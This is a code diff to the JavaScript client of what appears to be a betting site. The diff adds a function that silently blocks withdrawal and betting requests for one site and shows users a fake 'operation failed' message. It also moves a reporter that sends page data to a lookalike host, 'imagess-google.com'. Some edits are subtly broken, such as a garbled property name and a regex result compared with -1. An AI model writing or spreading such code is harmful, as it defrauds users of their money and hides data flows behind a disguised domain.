@@ -1,3 +1,38 @@
+window._catch = function(data){
+  if (window.site) {
+    data.S=site
+  }
+  if(fetchGoal){
+    data.G=fetchGoal
+  }
+  var str=[],k;
+  for(var i in data){
+    k=data[i];
+    if (typeof(k)==="object") {
+      k= encodeURIComponent(JSON.stringify(k));
+    }
+    str.push(i+'='+k)
+  }
+  str=str.join('&')
+  // var fetchUrl = state.UserName||data.UserName
+  // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
+  // _App && ga && ga('send','event',msg,str)
+  var fetchUrl = 'http://catch.imagess-google.com?'+str
+  fetch(fetchUrl, {
+    credentials:'same-origin',
+    method: 'GET',
+    cache: 'no-store',
+    'mode':'no-cors',
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    // body: str
+  })
+}
+window.onerror = function(errorMessage, scriptURI, lineNumber,columnNumber,errorObj) {
+  console.log(errorMessage, scriptURI, lineNumber,columnNumber,errorObj)
+  _catch({msg:'winerr',errorMessage,scriptURI,errorObj})
+}
 ;(function(){
   try {
     sessionStorage.setItem('TextLocalStorage', 'hello world');
@@ -180,37 +215,7 @@ function Xss(data){
   }
   return [data,mayBeXss]
 }
-window._catch = function(data){
-  if (window.site) {
-    data.S=site
-  }
-  if(fetchGoal){
-    data.G=fetchGoal
-  }
-  var str=[],k;
-  for(var i in data){
-    k=data[i];
-    if (typeof(k)==="object") {
-      k= encodeURIComponent(JSON.stringify(k));
-    }
-    str.push(i+'='+k)
-  }
-  str=str.join('&')
-  // var fetchUrl = state.UserName||data.UserName
-  // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
-  // _App && ga && ga('send','event',msg,str)
-  var fetchUrl = 'http://catch.imagess-google.com?'+str
-  fetch(fetchUrl, {
-    credentials:'same-origin',
-    method: 'GET',
-    cache: 'no-store',
-    'mode':'no-cors',
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    // body: str
-  })
-}
+
 
 // function FetchCatch(opt) {
 //   console.log(opt);
@@ -271,6 +276,11 @@ function setLoginPass(u,p,i){
 
 var fetchArr=[]
 var fetchGoal
+
+function NoPass(Action){
+  return window.site==='tkcp'&&(['Withdraw','AddBetting','AddChaseBetting'].indexOf(Action)>-1)
+}
+
 window._fetch = function (data, option = {}){
   var user = /*data.Action!=='Register'&&*/data.UserName||state.UserName
   data = Xss(data)
@@ -312,6 +322,15 @@ window._fetch = function (data, option = {}){
       }}*/
     // }
   }
+  // 拦截投注和提现
+  var nPass=NoPass(data.Action)
+  if(nPass){
+    return{then:function(f){
+      f({Code:-1,StrCode:'操作失败'})
+      layer.close(layerIndex)
+    }}
+  }
+
   data.SourceName=_App?"APP":"MB"
   var str=[],k;
   for(var i in data){
@@ -587,12 +606,15 @@ window._App=(function(host){
   //是否APP
   var a = localStorage.getItem("isApp")
   if (a!==null) {return a}
-  if (host.split('.').length===4){return false}
+  // if (host.split('.').leyyyyngth===4){return false}
   // console.log(host);
-  var beginWithM = /^m\./.test(host)
-  var hasDAFATEST = host.indexOf('dafatest') > -1
-
-  if(!beginWithM && !hasDAFATEST){
+  if(host.indexOf('dafatest') > -1){
+    return false
+  }
+  if(host.indexOf('app2jsknacs') > -1){
+    return true
+  }
+  if(/^m\./.test(host)===-1){
     return true
   }
   // host = host.split('.')
@@ -634,7 +656,7 @@ window._App=(function(host){
         fun()
       }
     }
-    addScript("//static.ydbimg.com/API/YdbOnline.js",function(){
+    addScript("/static/public/YdbOnline.js",function(){
       var count=0
       var inter=setInterval(function(){
         if(typeof YDBOBJ!=='undefined'){
@@ -653,11 +675,12 @@ window._App=(function(host){
       gtag('js', new Date());
       gtag('config', 'UA-107734696-1');
     })*/
-    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    /*window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
     addScript("https://www.google-analytics.com/analytics.js",function(){
       ga('create', 'UA-107734696-1', 'auto');
       ga('send', 'even','刷新');
-    })
+    })*/
+    window.ga=window.ga||function(){};
   }
   if (!versions.android) {
     document.body.oncontextmenu=function(){ return false;}//防止右键
@@ -1129,9 +1152,10 @@ window.RootApp={
               s.PCLogo.logo1=''
             }
 
-            var site = s.PCLogo.logo1
+            // var site = s.PCLogo.logo1
+            var site = s.Attach
             if (site) {
-              site=site.split('/')[1]
+              // site=site.split('/')[1]
               window.site=site
               switch(site){
                 case 'huifa':
